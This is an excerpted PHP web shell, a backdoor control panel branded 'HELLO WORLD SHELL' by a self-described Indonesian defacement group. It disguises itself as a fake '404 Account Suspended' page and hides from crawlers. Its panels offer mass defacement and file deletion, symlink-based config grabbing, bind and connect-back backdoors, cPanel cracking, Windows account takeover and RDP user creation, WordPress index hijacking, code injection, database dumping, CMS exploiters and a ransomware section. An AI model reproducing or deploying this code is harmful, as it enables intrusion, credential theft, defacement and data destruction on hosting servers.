...
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	...
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Account Suspended');
		exit;
	}
}

$password = "a1b9dc6bc6b59dae41f6613d7a2ea8c0"; // md5 : AduhPusingSyarafku+855
...
?>
	...
	<head>
		<title>404 Account Suspended</title>
		<h1>Account Suspended</h1>

		<p>The requested URL was Link Suspend on this server.</p>
...
for ($i = 0; $i < $___; $i++) {
	...
	<body>
		...
		<div class="container">
			...
			<div class="y x">
				<a href="?" class="ajx">
					<font color="black">HELLO WORLD SHELL</font>
				</a>
			</div>
	...
	MySQL : ' . $mysql . ' | MSSQL : ' . $mssql . ' | PostgreSQL : ' . $pgsql . ' | Perl : ' . $perl . ' | Python : ' . $python . ' | Ruby : ' . $ruby . ' |  WGET : ' . $wget . ' | cURL : ' . $curl . ' | Magic Quotes : ' . $magicquotes . ' | SSH2 : ' . $ssh2 . ' | Oracle : ' . $oracle . ' 
			...
			echo "<hr>
						<h2><center>Mass Tools HELLO WORLD SHELL</center></h2>
						<br>
						<center>
						<form method = 'POST'>
			...
			echo "<hr><br>";
			echo "<center>
						<h2> Symlink HELLO WORLD SHELL </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
			...
			if (isset($_POST['symlink'])) {
				...
				echo "<br><br><center><h2>Symlink HELLO WORLD SHELL</h2></center><br><br><center><div class=content>";
...
';
							...
							@fclose($fp3);
							echo "
 <h2><center>Symlink2 HELLO WORLD SHELL</center></h2>
 <table align=center border=1><tr>
 ...
 <td align=center><font class=txt>" . $matches . "</td>";
			...
			if ($_POST) {
				...
				echo "<hr><br><center>";
				echo "<h2>Config Grabber HELLO WORLD SHELL</h2>";
			...
			if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
				...
				if (eregi("./bdc $por", $scan)) {
					...
					$msg =  "<p>Process Link Suspend running, backdoor not setup successfully.</p>";
				}
			}
			...
			elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
				...
				if (is_file($namafile)) {
					...
					$msg = exe($wcmd);
				} else $msg = "error: file Link Suspend $namafile";
			}

		?>
			<hr><br>
			<center>
				<h2>Netsploit HELLO WORLD SHELL</h2>
				<table class="tabnet">
					<tr>
						<th>Port Binding</th>
						<th>Connect Back</th>
		...
		<?php
			...
			echo "<hr><br>";
			echo "<center>
						<h2> CGI HELLO WORLD SHELL </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
			...
			if ($_POST['mass'] == 'onedir') {
				...
				echo "
		<hr><br>
		<center><h2>Mass Deface / Delete Files HELLO WORLD SHELL</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		...
		<textarea class= 'form-control' name='script' style='width: 450px; height: 200px;'>Hacked By ./Kingworld</textarea><br>
		<input class= 'form-control' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
			...
			if ($_POST['hajar']) {
				...
				print "<center>
				<h2>Mass User Changer HELLO WORLD SHELL</h2>
				<form method='post'>
				...
				Set User & Pass: <br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='user_baru' value='Kingworld' placeholder='user_baru'><br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='pass_baru' value='Kingworld' placeholder='pass_baru'><br>
			...
			echo "<hr><br><center><h2>Mass Title Changer HELLO WORLD SHELL</h2>
<form method='post'>
Link Config: <br>
...
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
			...
			echo "<hr><br>";
			echo "<center><h2>Bypasser HELLO WORLD SHELL</h2></center><br>";
			...
			echo '
				...
				<h2>Bypass CloudFlare HELLO WORLD SHELL</h2>
				<div class = "row clearfix">
				<div class= "col-md-4">
		...
		?>
			<form action="?dir=<?php echo $dir; ?>&amp;do=bypassserver" method="post">
				<center /><br />
				<hr>
				<h2>Bypass Server HELLO WORLD SHELL</h2><br>
				<?php
				print '
...
';
			...
			if (isset($_POST['Colii'])) {
				...
				$Bok3p = symlink("/", "Kingworld.txt");
				$rt = "<br><a href=Kingworld.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
...
<tr>
    ...
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shexuser"></form></td>
			...
			echo "<hr><br>";
			echo "<center><h2>Exploiter HELLO WORLD SHELL</h2></center><br>";
			echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
			...
			echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter HELLO WORLD SHELL</h2><br><br>
...
<center><hr><br>
<h2>Revslider Exploiter HELLO WORLD SHELL</h2>
<form method='post'>
...
", $_POST['url']);
			...
			echo '<hr><center><h2>Auto Tools HELLO WORLD SHELL </h2><br>
...
<br><hr>';
			...
			?>
				<form action="" method="post">
					<center>
						<hr><br>
						<h2>Zone H Submit HELLO WORLD SHELL</h2>
						<u>Defacer :</u>
			...
			echo "<hr><br><center>
		<h2>Defacer ID Submit HELLO WORLD SHELL</h2>
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='./Kingworld'><br>
		<u>Team</u>: <br>
		...
		<input  class = 'form-control' style='width:250px; height:40px; 'type='submit' name='go' value='Submit'>
			...
			echo "<hr><br><center><h2>Jumping HELLO WORLD SHELL</h2>";
			...
			if ($_POST['reverse']) {
				...
				echo "<hr><br><center><h2>Fake Root HELLO WORLD SHELL</h2><form method='post'>
		...
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><hr><br>";
			...
			echo "<hr><br>";
			echo "<center><h2>Adminer HELLO WORLD SHELL</h2>";
			...
			if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
                ...
                ";
                    ...
                    <pre>$cek</pre>";
						...
						$cek = exe("net user $user Kingworld");
						if (preg_match("/$user/", exe("net user"))) {
							echo "[change password: <font color=lime>Kingworld</font>] -> ";
							if ($cek) {
					...
					echo "<hr><br><center>";
					echo "<h2>RDP HELLO WORLD SHELL</h2>";
					echo "-- Create RDP --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <u>Username:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='user' placeholder='username' value='Kingworld' required>
            </div>
            <div class = 'col-md-4'>
             <u>Password:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='pass' placeholder='password' value='Kingworld' required>
            </div>
            <div class = 'col-md-4'>
            <u>Button:</u>
...
<h2>Wordpress Hijack Index HELLO WORLD SHELL</h2><br>
<center>
...
<input style="width:250px;height:40px;" class="form-control" type="submit" name="up2" value="Hijack Index"><br></center><form><hr><br>';
		...
		<hr><br>
         <center>
         <h2>Cpanel Reset HELLO WORLD SHELL</h2>
         <br><br>
...
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
    ...
    ";
			...
			?>
				...
				<hr>
				<center>
					<h2>Reverse IP HELLO WORLD SHELL</h2>
...
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 ...
 #Ransomware Ini Berada Pada [dir]: <?php echo
   ...
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
					...
					echo "<hr><br>";
					echo '<center><h2>Mass Code Injector HELLO WORLD SHELL</h2></center>';
...
<h2>Database Dumper HELLO WORLD SHELL</h2>
<tr>
	<td>Server </td>
	...
	<input class="form-control" type=submit value="  Dump!  " ></td></tr>
					...
					if ($_POST['crack']) {
						...
						echo "<center><hr><br>
		<form method='post'>
		<h2>Cpanel Crack HELLO WORLD SHELL</h2>
		USER: <br>
		...
		<p align='center' class='cgx2'>Domains and Users</p>";
					...
					echo "
<hr><br>
<br><center><h2>Whmcs Decoder HELLO WORLD SHELL</h2></center>
...
";
					...
					echo "<hr><br>";
					echo "<center><h2>Scanner HELLO WORLD SHELL</h2></center><br>";
					echo "<form method = 'POST'>
						<center>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
...
';
					...
					echo "<center>";
					echo '<hr><br>
<h2>CMS Vulnerability Scanner HELLO WORLD SHELL</h2>
<form method="POST" action=""  class="header-izz">
    ...
    <input class = "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
					...
					echo "<hr><br><center>";
					echo '<table><h2>Ports Scanner HELLO WORLD SHELL</h2><td>';
					...
					echo '<hr><br>';
					echo "<Center>\n";
					echo "<h2>Log Hunter HELLO WORLD SHELL</h2>";
					echo "<form action=\"\" method=\"post\">\n";
...
*/
																																		...
																																		echo "We Are : <br>
			    Jinzo - Lord.Acil - SQL47.id - ./Kingworld - Security_Hunterz - CrazyClownZz - Lastcar_Jihood - Mr.IP - Sy3rifb0y - Mr.Syn10_10 - CLAY97 - Devil!Hunter <br><br>
				";
				...
				<footer class="x">
					<center>&copy; Author : TheAlmightyZeus , Design : Con7ext | Recoded By ./Kingworld - Index Attacker ~ Indonesian Hacker Rulez </center>
				</footer>
				<?php
				if (isset($_GET["1"])) {
					echo $f;
